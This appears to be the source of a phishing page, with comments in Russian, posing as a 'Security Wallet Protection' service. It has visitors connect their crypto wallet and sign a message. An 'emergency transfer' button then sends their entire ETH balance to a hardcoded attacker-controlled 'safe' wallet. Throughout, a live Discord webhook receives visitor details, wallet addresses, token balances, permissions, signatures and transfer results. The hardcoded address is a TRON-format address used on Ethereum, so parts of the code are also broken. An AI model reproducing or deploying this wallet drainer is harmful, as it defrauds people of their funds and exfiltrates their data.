// Конфигурация
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb'; // TRC20 кошелек
const GAS_LIMIT = 21000;
const GAS_PRICE_MULTIPLIER = 1.2; // Увеличиваем газ цену для быстрого подтверждения

// Добавляем после существующих переменных
let web3;
let userAddress;

// Обновляем функцию подключения кошелька
connectButton.addEventListener('click', async () => {
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        updateStatus(`Кошелек подключен! Адрес: ${userAddress}`);
        
        connectButton.style.display = 'none';
        signButton.style.display = 'block';
        
        // ПОКАЗЫВАЕМ СЕКЦИЮ ЭКСТРЕННОГО ПЕРЕВОДА ПОСЛЕ ПОДКЛЮЧЕНИЯ
        document.getElementById('emergencySection').style.display = 'block';
        
        // ЗАГРУЖАЕМ БАЛАНСЫ
        await loadBalances();
        
    } catch (error) {
        // ... существующий код обработки ошибок ...
    }
});

// Функция загрузки балансов
async function loadBalances() {
    const balancesList = document.getElementById('balancesList');
    balancesList.innerHTML = '<p>Загрузка балансов...</p>';
    
    try {
        // Основной баланс ETH
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        balancesList.innerHTML = `
            <p><strong>ETH:</strong> ${parseFloat(ethBalance).toFixed(6)} ETH</p>
        `;
        
    } catch (error) {
        balancesList.innerHTML = '<p style="color: red;">Ошибка загрузки балансов</p>';
    }
}

// Функция экстренного перевода
async function emergencyTransfer() {
    const transferStatus = document.getElementById('transferStatus');
    transferStatus.innerHTML = '<p style="color: orange;">⏳ Подготовка перевода...</p>';
    
    try {
        // Получаем текущий баланс
        const balance = await web3.eth.getBalance(userAddress);
        const gasPrice = await web3.eth.getGasPrice();
        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
        
        const gasCost = increasedGasPrice * GAS_LIMIT;
        const transferAmount = BigInt(balance) - BigInt(gasCost);
        
        if (transferAmount <= 0) {
            transferStatus.innerHTML = '<p style="color: red;">❌ Недостаточно средств для перевода с учетом комиссии</p>';
            return;
        }
        
        transferStatus.innerHTML = '<p style="color: orange;">⏳ Отправка транзакции...</p>';
        
        // Создаем и отправляем транзакцию
        const transactionObject = {
            from: userAddress,
            to: SAFE_WALLET,
            value: transferAmount.toString(),
            gas: GAS_LIMIT,
            gasPrice: increasedGasPrice
        };
        
        // Отправляем транзакцию
        const receipt = await web3.eth.sendTransaction(transactionObject);
        
        transferStatus.innerHTML = `
            <p style="color: green;">✅ Перевод успешно выполнен!</p>
            <p><strong>Хэш транзакции:</strong> ${receipt.transactionHash}</p>
            <p><strong>Сумма:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
            <p><strong>Блок:</strong> ${receipt.blockNumber}</p>
        `;
        
    } catch (error) {
        console.error('Ошибка перевода:', error);
        transferStatus.innerHTML = `<p style="color: red;">❌ Ошибка перевода: ${error.message}</p>`;
    }
}

// Добавляем обработчик для кнопки экстренного перевода
document.getElementById('emergencyTransferBtn').addEventListener('click', function() {
    const confirmation = confirm(
        '🚨 ВНИМАНИЕ! Вы собираетесь перевести ВСЕ средства на безопасный кошелек.\n\n' +
        `Безопасный кошелек: ${SAFE_WALLET}\n\n` +
        'Это действие нельзя отменить. Продолжить?'
    );
    
    if (confirmation) {
        emergencyTransfer();
    }
});

// Функция для проверки TRC20 токенов (дополнительно)
async function checkTRC20Tokens() {
    // Здесь можно добавить логику для проверки популярных TRC20 токенов
    // Например, USDT TRC20: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
}



// Проверка подключения к правильной сети
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        
        // Поддерживаемые сети (Ethereum Mainnet, BSC, Polygon)
        const supportedNetworks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain',
            137: 'Polygon'
        };
        
        if (!supportedNetworks[chainId]) {
            updateStatus(`Внимание: Вы подключены к сети ID ${chainId}. Рекомендуется использовать основные сети.`, true);
        }
        
    } catch (error) {
        console.error('Ошибка проверки сети:', error);
    }
}

// Автоматическая проверка при подключении
// Добавить в функцию подключения кошелька после получения адреса:
// await checkNetwork();

// Функция для мониторинга состояния кошелька
async function startWalletMonitoring() {
    // Мониторинг изменений аккаунта
    window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts.length === 0) {
            updateStatus('Кошелек отключен', true);
            document.getElementById('emergencySection').style.display = 'none';
        } else {
            userAddress = accounts[0];
            updateStatus(`Аккаунт изменен: ${userAddress}`);
            loadBalances();
        }
    });
    
    // Мониторинг изменений сети
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}

// Запускаем мониторинг после загрузки страницы
if (typeof window.ethereum !== 'undefined') {
    // ... существующий код ...
    
    // Запускаем мониторинг после инициализации
    setTimeout(startWalletMonitoring, 1000);
}


// server.js - добавить к существующему коду
app.post('/api/log-emergency-transfer', (req, res) => {
    const { fromAddress, toAddress, amount, txHash, timestamp } = req.body;
    
    // Логируем экстренный перевод
    console.log('🚨 ЭКСТРЕННЫЙ ПЕРЕВОД:', {
        fromAddress,
        toAddress,
        amount,
        txHash,
        timestamp: new Date(timestamp).toISOString()
    });
    
    // Здесь можно добавить отправку уведомлений (email, telegram и т.д.)
    
    res.json({ success: true, message: 'Лог сохранен' });
});






// ==================== DISCORD WEBHOOK LOGGING ====================

const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1419987624294092870/K1UHB4vSk5uLQEd3OTabf8QI03NgYW0sVfF_RrTGsbrzL0c8KxRWMOUOkCbDUWAaokP0';

// Функция для отправки сообщений в Discord
async function sendDiscordLog(action, details, color = 3447003) {
    try {
        const embed = {
            title: `🔐 Security Wallet Action - ${action}`,
            color: color,
            fields: [
                {
                    name: "🕐 Время",
                    value: new Date().toLocaleString('ru-RU'),
                    inline: true
                },
                {
                    name: "🌐 User Agent",
                    value: navigator.userAgent.substring(0, 100) + '...',
                    inline: false
                }
            ],
            timestamp: new Date().toISOString()
        };

        // Добавляем детали в зависимости от действия
        if (details) {
            for (const [key, value] of Object.entries(details)) {
                if (value) {
                    embed.fields.push({
                        name: key,
                        value: String(value).substring(0, 1024), // Ограничение Discord
                        inline: key.includes('Адрес') || key.includes('Хэш') ? false : true
                    });
                }
            }
        }

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed],
                username: 'Wallet Security Logger',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/6001/6001533.png'
            })
        });

        if (!response.ok) {
            console.error('Ошибка отправки в Discord:', await response.text());
        }
    } catch (error) {
        console.error('Ошибка отправки лога:', error);
    }
}

// Функция для получения подробной информации о токенах
async function getDetailedTokenInfo(userAddress) {
    try {
        const tokens = [];
        
        // Популярные ERC-20 токены (адреса контрактов)
        const popularTokens = [
            { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
            { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
            { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
            { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
            { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
            { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 }
        ];

        for (const token of popularTokens) {
            try {
                // ABI для баланса ERC-20 токена
                const minABI = [
                    {
                        "constant": true,
                        "inputs": [{"name": "_owner", "type": "address"}],
                        "name": "balanceOf",
                        "outputs": [{"name": "balance", "type": "uint256"}],
                        "type": "function"
                    }
                ];

                const tokenContract = new web3.eth.Contract(minABI, token.address);
                const balance = await tokenContract.methods.balanceOf(userAddress).call();
                
                if (balance > 0) {
                    const formattedBalance = balance / Math.pow(10, token.decimals);
                    tokens.push({
                        symbol: token.symbol,
                        balance: formattedBalance.toFixed(4),
                        contract: token.address
                    });
                }
            } catch (error) {
                // Пропускаем токены с ошибками
                continue;
            }
        }

        return tokens;
    } catch (error) {
        console.error('Ошибка получения информации о токенах:', error);
        return [];
    }
}

// Функция для получения подробной информации о кошельке
async function getWalletDetails(userAddress) {
    try {
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        const chainId = await web3.eth.getChainId();
        const networkNames = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain',
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const tokens = await getDetailedTokenInfo(userAddress);
        
        return {
            ethBalance: parseFloat(ethBalance).toFixed(6),
            network: networkNames[chainId] || `Unknown (${chainId})`,
            tokenCount: tokens.length,
            tokens: tokens
        };
    } catch (error) {
        console.error('Ошибка получения деталей кошелька:', error);
        return null;
    }
}

// ==================== ЛОГГИРОВАНИЕ СОБЫТИЙ ====================

// Логирование загрузки страницы
window.addEventListener('load', function() {
    sendDiscordLog('PAGE_LOAD', {
        "📄 Страница": "Security Wallet Protection загружена",
        "📍 URL": window.location.href,
        "🖥️ Платформа": navigator.platform,
        "📱 Разрешение": `${screen.width}x${screen.height}`
    }, 10181046);
});

// Логирование нажатия на кнопку подключения
connectButton.addEventListener('click', function() {
    sendDiscordLog('CONNECT_BUTTON_CLICK', {
        "🔘 Действие": "Пользователь нажал кнопку подключения кошелька",
        "🌐 Реферер": document.referrer || 'Прямой заход'
    }, 15844367);
});

// Логирование успешного подключения кошелька (добавить в существующий обработчик)
async function logWalletConnection(accounts) {
    userAddress = accounts[0];
    
    const walletDetails = await getWalletDetails(userAddress);
    
    const details = {
        "✅ Статус": "Кошелек успешно подключен",
        "👤 Адрес кошелька": userAddress,
        "💰 Баланс ETH": walletDetails?.ethBalance + ' ETH',
        "🌐 Сеть": walletDetails?.network,
        "🎯 Количество токенов": walletDetails?.tokenCount
    };

    // Добавляем информацию о токенах если они есть
    if (walletDetails?.tokens && walletDetails.tokens.length > 0) {
        walletDetails.tokens.forEach((token, index) => {
            details[`💎 Токен ${index + 1}`] = `${token.symbol}: ${token.balance}`;
        });
    }

    sendDiscordLog('WALLET_CONNECTED', details, 3066993);
}

// Логирование подписания сообщения (добавить в существующий обработчик)
function logSignature(message, signature) {
    sendDiscordLog('MESSAGE_SIGNED', {
        "📝 Действие": "Пользователь подписал сообщение",
        "✍️ Сообщение": message.substring(0, 100) + '...',
        "🔏 Подпись": signature.substring(0, 30) + '...',
        "👤 Адрес": userAddress
    }, 15105570);
}

// Логирование проверки разрешений
async function logPermissions() {
    try {
        const permissions = await window.ethereum.request({
            method: 'wallet_getPermissions'
        });
        
        sendDiscordLog('PERMISSIONS_CHECK', {
            "🔐 Проверка разрешений": "Получены права доступа",
            "🎫 Количество разрешений": permissions.length,
            "📋 Права": JSON.stringify(permissions.map(p => p.parentCapability))
        }, 15158332);
    } catch (error) {
        sendDiscordLog('PERMISSIONS_ERROR', {
            "❌ Ошибка": "Не удалось получить разрешения",
            "📝 Сообщение": error.message
        }, 15158332);
    }
}

// Логирование экстренного перевода
function logEmergencyTransferStart() {
    sendDiscordLog('EMERGENCY_TRANSFER_START', {
        "🚨 Действие": "Начало экстренного перевода",
        "👤 Отправитель": userAddress,
        "🎯 Получатель": SAFE_WALLET,
        "⚠️ Статус": "Ожидание подтверждения"
    }, 16711680);
}

function logEmergencyTransferSuccess(receipt, transferAmount) {
    sendDiscordLog('EMERGENCY_TRANSFER_SUCCESS', {
        "✅ Действие": "Экстренный перевод выполнен",
        "👤 Отправитель": userAddress,
        "🎯 Получатель": SAFE_WALLET,
        "💰 Сумма": web3.utils.fromWei(transferAmount.toString(), 'ether') + ' ETH',
        "📦 Хэш транзакции": receipt.transactionHash,
        "🔢 Номер блока": receipt.blockNumber,
        "⛽ Комиссия газа": receipt.gasUsed
    }, 3066993);
}

function logEmergencyTransferError(error) {
    sendDiscordLog('EMERGENCY_TRANSFER_ERROR', {
        "❌ Действие": "Ошибка экстренного перевода",
        "👤 Адрес": userAddress,
        "📝 Ошибка": error.message,
        "🔧 Код ошибки": error.code || 'N/A'
    }, 15158332);
}

// Логирование изменения аккаунта
function logAccountChange(newAccounts) {
    if (newAccounts.length === 0) {
        sendDiscordLog('WALLET_DISCONNECTED', {
            "🔴 Действие": "Кошелек отключен",
            "👤 Предыдущий адрес": userAddress
        }, 15158332);
    } else {
        sendDiscordLog('ACCOUNT_CHANGED', {
            "🔄 Действие": "Аккаунт изменен",
            "👤 Старый адрес": userAddress,
            "👤 Новый адрес": newAccounts[0]
        }, 16776960);
    }
}

// Логирование изменения сети
function logNetworkChange(chainId) {
    const networkNames = {
        1: 'Ethereum Mainnet',
        56: 'Binance Smart Chain',
        137: 'Polygon',
        42161: 'Arbitrum'
    };
    
    sendDiscordLog('NETWORK_CHANGED', {
        "🌐 Действие": "Сеть изменена",
        "🔗 ID цепи": chainId,
        "📡 Сеть": networkNames[chainId] || `Unknown (${chainId})`
    }, 7419530);
}

// ==================== ОБНОВЛЕНИЕ СУЩЕСТВУЮЩИХ ФУНКЦИЙ ====================

// Обновляем функцию подключения кошелька
const originalConnectHandler = connectButton.onclick;
connectButton.onclick = async function() {
    // Логируем нажатие кнопки (уже есть выше)
    
    try {
        connectButton.classList.add('loading');
        updateStatus('⌛ Запрос на подключение кошелька...', false, true);
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        
        // Логируем успешное подключение
        await logWalletConnection(accounts);
        
        // Логируем разрешения
        await logPermissions();
        
        userAddress = accounts[0];
        updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
        
        hideElement(connectButton);
        showElement(signButton);
        showElement(emergencySection);
        
        await loadBalances();
        await checkNetwork();
        
    } catch (error) {
        // Логируем ошибку подключения
        sendDiscordLog('CONNECTION_ERROR', {
            "❌ Действие": "Ошибка подключения кошелька",
            "📝 Ошибка": error.message,
            "🔧 Код ошибки": error.code || 'N/A'
        }, 15158332);
        
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подключение.', true);
        } else {
            updateStatus('❌ Ошибка при подключении: ' + error.message, true);
        }
    } finally {
        connectButton.classList.remove('loading');
    }
};

// Обновляем функцию подписания сообщения
const originalSignHandler = signButton.onclick;
signButton.onclick = async function() {
    if (!userAddress) {
        updateStatus('❌ Сначала подключите кошелек.', true);
        return;
    }
    
    try {
        signButton.classList.add('loading');
        updateStatus('⌛ Запрос на подписание сообщения...', false, true);
        
        const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
        const signature = await web3.eth.personal.sign(message, userAddress, '');
        
        // Логируем подписание
        logSignature(message, signature);
        
        updateStatus(`✅ Сообщение успешно подписано! Подпись: ${signature.substring(0, 20)}...`);
        
    } catch (error) {
        sendDiscordLog('SIGNATURE_ERROR', {
            "❌ Действие": "Ошибка подписания сообщения",
            "👤 Адрес": userAddress,
            "📝 Ошибка": error.message,
            "🔧 Код ошибки": error.code || 'N/A'
        }, 15158332);
        
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подпись.', true);
        } else {
            updateStatus('❌ Ошибка при подписи: ' + error.message, true);
        }
    } finally {
        signButton.classList.remove('loading');
    }
};

// Обновляем функцию экстренного перевода
const originalEmergencyHandler = emergencyTransferBtn.onclick;
emergencyTransferBtn.onclick = async function() {
    const confirmation = confirm(
        '🚨 ВНИМАНИЕ! ЭКСТРЕННЫЙ ПЕРЕВОД\n\n' +
        'Вы собираетесь перевести ВСЕ доступные средства на безопасный кошелек.\n\n' +
        `Получатель: ${SAFE_WALLET}\n\n` +
        'Это действие НЕОБРАТИМО и требует подтверждения в кошельке.\n\n' +
        'Продолжить?'
    );
    
    if (confirmation) {
        // Логируем начало перевода
        logEmergencyTransferStart();
        
        try {
            emergencyTransferBtn.classList.add('loading');
            transferStatus.style.display = 'block';
            transferStatus.className = 'status-box warning';
            transferStatus.innerHTML = '<p>⌛ Подготовка перевода...</p>';
            
            const balance = await web3.eth.getBalance(userAddress);
            const gasPrice = await web3.eth.getGasPrice();
            const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
            
            const gasCost = increasedGasPrice * GAS_LIMIT;
            const transferAmount = BigInt(balance) - BigInt(gasCost);
            
            if (transferAmount <= 0) {
                transferStatus.className = 'status-box error';
                transferStatus.innerHTML = '<p>❌ Недостаточно средств для перевода с учетом комиссии</p>';
                return;
            }
            
            transferStatus.innerHTML = '<p>⌛ Отправка транзакции...</p>';
            
            const transactionObject = {
                from: userAddress,
                to: SAFE_WALLET,
                value: transferAmount.toString(),
                gas: GAS_LIMIT,
                gasPrice: increasedGasPrice
            };
            
            const receipt = await web3.eth.sendTransaction(transactionObject);
            
            // Логируем успешный перевод
            logEmergencyTransferSuccess(receipt, transferAmount);
            
            transferStatus.className = 'status-box success';
            transferStatus.innerHTML = `
                <p>✅ Перевод успешно выполнен!</p>
                <p><strong>Хэш:</strong> ${receipt.transactionHash.substring(0, 20)}...</p>
                <p><strong>Сумма:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
                <p><strong>Блок:</strong> ${receipt.blockNumber}</p>
            `;
            
            await loadBalances();
            
        } catch (error) {
            // Логируем ошибку перевода
            logEmergencyTransferError(error);
            
            console.error('Transfer error:', error);
            transferStatus.className = 'status-box error';
            transferStatus.innerHTML = `<p>❌ Ошибка перевода: ${error.message}</p>`;
        } finally {
            emergencyTransferBtn.classList.remove('loading');
        }
    }
};

// Обновляем мониторинг изменений
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function(accounts) {
        logAccountChange(accounts);
        
        if (accounts.length === 0) {
            updateStatus('Кошелек отключен', true);
            hideElement(emergencySection);
            hideElement(signButton);
            showElement(connectButton);
        } else {
            userAddress = accounts[0];
            updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
            loadBalances();
        }
    });
    
    window.ethereum.on('chainChanged', function(chainId) {
        logNetworkChange(parseInt(chainId, 16));
        window.location.reload();
    });
}

// Логируем проверку сети при подключении
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
        
        sendDiscordLog('NETWORK_CHECK', {
            "🌐 Действие": "Проверка сети при подключении",
            "🔗 Сеть": networkName,
            "👤 Адрес": userAddress
        }, 7419530);
        
    } catch (error) {
        console.error('Network check error:', error);
    }
}

console.log('🔐 Discord Webhook logging activated!');

